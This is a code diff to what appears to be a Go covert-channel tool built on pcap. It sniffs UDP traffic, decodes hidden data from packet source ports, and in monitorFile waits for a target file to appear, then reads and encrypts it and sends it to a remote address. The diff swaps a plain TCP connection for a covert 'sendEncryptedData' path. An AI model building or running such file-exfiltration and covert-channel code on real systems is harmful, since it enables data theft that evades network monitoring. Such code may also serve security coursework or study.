@@ -53,6 +53,7 @@ const helpStr = "Client Usage Help\n" +"=================================\n" +
 
 var authenticatedAddr string //Currently authenticated address
 var handle *pcap.Handle
+var fhandle *pcap.Handle
 var err error
 var localip net.IP
 var localmac net.HardwareAddr
@@ -119,6 +120,13 @@ func main(){
 	err = handle.SetBPFFilter("udp")
 	checkError(err)
 
+	fhandle, err = pcap.OpenLive(*interfacePtr, 1600, true, pcap.BlockForever)
+	checkError(err)
+	defer fhandle.Close()
+
+	err = fhandle.SetBPFFilter("udp")
+	checkError(err)
+
 	switch *modePtr {
 	case "client":
 		fmt.Printf("Running in client mode. Connecting to %s at port %d.\n", *ipPtr, *portPtr)
@@ -161,10 +169,8 @@ func beginListen(ip string, port, lport uint16) {
 		
 		if pType == CLIENT {
 			if incomingIP  == ip && uint16(udpLayer.DstPort) == lport {
-
 				err = binary.Write(buffer, binary.BigEndian, MAX_PORT - uint16(udpLayer.SrcPort))
 				checkError(err)
-
 			} else if incomingIP == ip && uint16(udpLayer.DstPort) == SND_CMPLETE {
 				fmt.Print(buffer)
 				buffer.Reset()
@@ -260,20 +266,14 @@ func monitorFile(ip, filename string, port uint16){
 	for {
 		time.Sleep(1000 * time.Millisecond);
 		if _, err := os.Stat(filename); err == nil {
-		
 			fmt.Printf("Found file %s\n", filename)
-
-			target := fmt.Sprintf("%s:%d", ip, port)
-			conn, err  := net.Dial("tcp", target)
-			checkError(err)
 
 			file, err := ioutil.ReadFile(filename)
 			checkError(err)
-		
 
 			data := encrypt_data(string(file))
-
-			fmt.Fprintf(conn, string(data))
+			
+			sendEncryptedData(port, string(data), ip)
 			return
 		}
 	}
